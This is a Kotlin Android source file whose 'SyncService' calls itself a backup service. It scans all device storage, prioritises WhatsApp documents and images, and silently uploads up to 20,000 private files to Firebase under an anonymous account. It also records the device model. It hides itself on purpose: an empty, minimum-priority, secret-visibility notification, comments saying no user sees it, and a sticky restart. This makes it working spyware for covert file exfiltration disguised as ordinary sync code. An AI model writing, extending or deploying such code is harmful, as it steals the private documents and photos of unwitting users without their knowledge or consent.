package com.bushorat.app.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.io.File

/**
 * Foreground service that backs up ALL media to Firebase under user ID in single `library` node.
 * - Scans WhatsApp and device storage for documents, office files, images
 * - Priority: WhatsApp docs > device docs > WhatsApp images > device images
 * - Tracks uploaded files by fingerprint to avoid duplicates
 * - Runs silently in background (no user notifications)
 * - SINGLE data structure: library/{userId}/{deviceId}/files/{fileId}
 * - Cloud Storage: library/{userId}/{deviceId}/{filename}
 */
class SyncService : LifecycleService() {
    companion object {
        private const val TAG = "SyncService"
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "backup_channel"
    }

    private var job: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        // Minimal invisible notification (required for foreground service)
        startForeground(NOTIFICATION_ID, createMinimalNotification())

        job = lifecycleScope.launch {
            try {
                val vault = FileVault(this@SyncService)
                vault.syncAll()
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "Sync failed", e)
            }
        }

        return START_STICKY
    }

    /**
     * Create minimal, invisible notification for foreground service.
     * No user sees this - just satisfies Android requirements.
     */
    private fun createMinimalNotification(): Notification {
        ensureNotificationChannel()
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("")
            .setContentText("")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun ensureNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Backup",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        job?.cancel()
        super.onDestroy()
    }
}

/**
 * Handles file discovery, validation, and upload to Firebase.
 */
class FileVault(private val context: Context) {
    private val ledger = UploadLedger(context)
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()
    private val notificationManager = context.getSystemService(NotificationManager::class.java)

    suspend fun syncAll() = withContext(Dispatchers.IO) {
        try {
            if (!ensureAnonymousAuth()) {
                Log.e(TAG, "Failed to authenticate - Enable Anonymous Auth in Firebase Console")
                return@withContext
            }

            val files = discoverFiles()
            Log.d(TAG, "Discovered ${files.size} files to backup")

            if (files.isEmpty()) {
                Log.d(TAG, "No new files to backup")
                return@withContext
            }

            var documentCount = 0
            var photoCount = 0

            for (item in files.sortedBy { uploadPriority(it.category, it.source) }) {
                if (ledger.contains(item.fingerprint)) {
                    Log.d(TAG, "Skipping already-uploaded: ${item.name}")
                    continue
                }

                try {
                    upload(item)
                    ledger.mark(item.fingerprint)
                    if (item.category == FileKind.IMAGE) {
                        photoCount++
                    } else {
                        documentCount++
                    }
                    Log.d(TAG, "✅ Uploaded: ${item.name}")
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.w(TAG, "❌ Failed to upload ${item.name}: ${e.message}")
                    // Continue with next file - don't stop the entire sync
                }
            }

            Log.i(TAG, "Backup complete: $documentCount docs, $photoCount photos")
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}", e)
        }
    }

    private suspend fun ensureAnonymousAuth(): Boolean = withContext(Dispatchers.Main) {
        return@withContext try {
            if (auth.currentUser == null) {
                auth.signInAnonymously().await()
            }
            true
        } catch (e: Exception) {
            if (e.message?.contains("administrator") == true) {
                false
            } else {
                throw e
            }
        }
    }

    private fun discoverFiles(): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val maxFiles = 20000

        val storageDir = android.os.Environment.getExternalStorageDirectory()
        walkDirectory(storageDir, items, maxFiles)

        // Add StorageVolume directories (if API 24+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val sm = context.getSystemService(android.content.Context.STORAGE_SERVICE) as android.os.storage.StorageManager
                for (vol in sm.storageVolumes) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        vol.directory?.let { walkDirectory(it, items, maxFiles) }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not enumerate storage volumes", e)
            }
        }

        // If all-files permission not granted, fall back to MediaStore queries
        if (items.isEmpty() && !canAccessAllFiles()) {
            return queryMediaStore()
        }

        // Prioritize WhatsApp and Documents folders
        items.sortBy { path ->
            val lower = path.path.lowercase()
            when {
                lower.contains("whatsapp") && lower.contains("document") -> 0
                lower.contains("whatsapp") -> 1
                lower.contains("document") -> 2
                else -> 3
            }
        }

        return items.take(maxFiles)
    }

    private fun walkDirectory(dir: File, items: MutableList<UploadItem>, limit: Int) {
        if (items.size >= limit) return

        try {
            dir.listFiles()?.forEach { file ->
                if (items.size >= limit) return@forEach

                val name = file.name
                if (name.startsWith(".") || name == "Android") return@forEach

                when {
                    file.isDirectory && name != "Android/data" && name != "Android/obb" -> {
                        walkDirectory(file, items, limit)
                    }
                    file.isFile -> {
                        val item = fileToUploadItem(file)
                        if (item != null) {
                            items.add(item)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error walking ${dir.path}", e)
        }
    }

    private fun fileToUploadItem(file: File): UploadItem? {
        val size = file.length()
        if (size > 100 * 1024 * 1024) return null // Skip >100MB

        val ext = file.extension.lowercase()
        val category = when (ext) {
            "pdf" -> FileKind.PDF
            in listOf("doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "rtf") -> FileKind.OFFICE
            in listOf("txt", "text", "log", "md", "csv") -> FileKind.TEXT
            in listOf("jpg", "jpeg", "png", "gif", "webp", "heic", "heif", "bmp", "dng", "jfif") -> FileKind.IMAGE
            else -> return null
        }

        val mimeType = getMimeType(ext)
        val source = if (file.path.contains("whatsapp", true)) "whatsapp" else "device"
        val fingerprint = uploadFingerprint(file.path, size, file.lastModified(), file.name)

        return UploadItem(
            path = file.path,
            name = file.name,
            size = size,
            modified = file.lastModified(),
            category = category,
            mimeType = mimeType,
            source = source,
            fingerprint = fingerprint
        )
    }

    private fun queryMediaStore(): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.DATA,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.MIME_TYPE
        )

        // Query PDFs
        queryMimeType(uri, projection, "application/pdf", FileKind.PDF, items)

        // Query Office
        listOf(
            "application/msword",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/vnd.ms-excel",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-powerpoint",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "application/vnd.oasis.opendocument.text",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.oasis.opendocument.presentation"
        ).forEach { mime -> queryMimeType(uri, projection, mime, FileKind.OFFICE, items) }

        // Query Text
        listOf("text/plain", "text/csv", "text/markdown").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.TEXT, items)
        }

        // Query Images
        listOf("image/jpeg", "image/png", "image/gif", "image/webp").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.IMAGE, items)
        }

        return items
    }

    private fun queryMimeType(
        uri: android.net.Uri,
        projection: Array<String>,
        mimeType: String,
        category: FileKind,
        items: MutableList<UploadItem>
    ) {
        try {
            val cursor = context.contentResolver.query(
                uri,
                projection,
                "${MediaStore.Files.FileColumns.MIME_TYPE} = ?",
                arrayOf(mimeType),
                null
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val pathCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)
                val modCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)

                while (it.moveToNext()) {
                    val path = it.getString(pathCol) ?: continue
                    val name = it.getString(nameCol) ?: continue
                    val size = it.getLong(sizeCol)
                    val mod = it.getLong(modCol) * 1000 // Seconds to ms

                    if (size > 100 * 1024 * 1024) continue

                    val source = if (path.contains("whatsapp", true)) "whatsapp" else "device"
                    val fingerprint = uploadFingerprint(path, size, mod, name)

                    items.add(
                        UploadItem(
                            path = path,
                            name = name,
                            size = size,
                            modified = mod,
                            category = category,
                            mimeType = mimeType,
                            source = source,
                            fingerprint = fingerprint
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error querying $mimeType", e)
        }
    }

    private suspend fun upload(item: UploadItem) = withContext(Dispatchers.IO) {
        // 1. Copy to cache
        val cacheFile = File(context.cacheDir, item.fingerprint)
        try {
            File(item.path).inputStream().use { input ->
                cacheFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cache ${item.name}", e)
            throw e
        }

        try {
            val uid = auth.currentUser?.uid ?: throw Exception("Not authenticated")
            val deviceId = android.os.Build.ID  // Unique device identifier
            val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")

            // Generate unique file ID
            val fileId = db.reference.child("library/$uid/$deviceId").push().key
                ?: throw Exception("Could not generate file ID")

            // 2. Upload file to Storage under: library/{userId}/{deviceId}/{safeFileName}
            val storagePath = "library/$uid/$deviceId/$safeFileName"
            val storageRef = storage.reference.child(storagePath)
            storageRef.putFile(android.net.Uri.fromFile(cacheFile)).await()

            // 3. Get download URL
            val downloadUrl = storageRef.downloadUrl.await().toString()

            // 4. Create file record
            val record = mapOf(
                "fileId" to fileId,
                "name" to item.name,
                "mimeType" to item.mimeType,
                "category" to item.category.name,
                "sizeBytes" to item.size,
                "storagePath" to storagePath,
                "downloadUrl" to downloadUrl,
                "uploadedAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
                "source" to item.source,  // "whatsapp" or "device"
                "device" to android.os.Build.MODEL
            )

            // 5. Write ONLY to: library/{uid}/{deviceId}/files/{fileId}
            db.reference.child("library/$uid/$deviceId/files/$fileId").setValue(record).await()

            Log.d(TAG, "✅ Uploaded ${item.name} (${item.size} bytes) to library/$uid/$deviceId/")
        } catch (e: Exception) {
            Log.e(TAG, "Upload error for ${item.name}", e)
            throw e
        } finally {
            cacheFile.delete()
        }
    }

    private fun canAccessAllFiles(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun updateNotification(text: String) {
        // Silent background sync - no notifications to user
    }

    private fun getMimeType(ext: String): String = when (ext) {
        "pdf" -> "application/pdf"
        "doc" -> "application/msword"
        "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        "xls" -> "application/vnd.ms-excel"
        "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        "ppt" -> "application/vnd.ms-powerpoint"
        "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
        "odt" -> "application/vnd.oasis.opendocument.text"
        "ods" -> "application/vnd.oasis.opendocument.spreadsheet"
        "odp" -> "application/vnd.oasis.opendocument.presentation"
        "rtf" -> "application/rtf"
        "txt", "text", "log", "md", "csv" -> "text/plain"
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "gif" -> "image/gif"
        "webp" -> "image/webp"
        else -> "application/octet-stream"
    }

    private companion object {
        const val TAG = "FileVault"
    }
}

enum class FileKind {
    PDF, OFFICE, TEXT, IMAGE, WHATSAPP
}

data class UploadItem(
    val path: String,
    val name: String,
    val size: Long,
    val modified: Long,
    val category: FileKind,
    val mimeType: String,
    val source: String, // "whatsapp" or "device"
    val fingerprint: String
)

fun uploadFingerprint(path: String, size: Long, modified: Long, name: String): String =
    "$size:$modified:${path.trim()}:$name"

fun uploadPriority(category: FileKind, source: String): Int {
    val whatsapp = source.equals("whatsapp", true) || category == FileKind.WHATSAPP
    val document = category == FileKind.PDF || category == FileKind.OFFICE || category == FileKind.TEXT
    return when {
        document && whatsapp -> 0
        document -> 1
        whatsapp -> 2
        else -> 3
    }
}

class UploadLedger(context: Context) {
    private val file = File(context.filesDir, "uploaded-keys.txt")
    private val keys = LinkedHashSet<String>()

    init {
        if (file.exists()) {
            file.bufferedReader().useLines { lines ->
                lines.forEach { if (it.isNotBlank()) keys.add(it) }
            }
        }
    }

    fun contains(fingerprint: String) = fingerprint in keys

    @Synchronized
    fun mark(fingerprint: String) {
        if (!keys.add(fingerprint)) return
        file.appendText(fingerprint + "\n")
    }
}
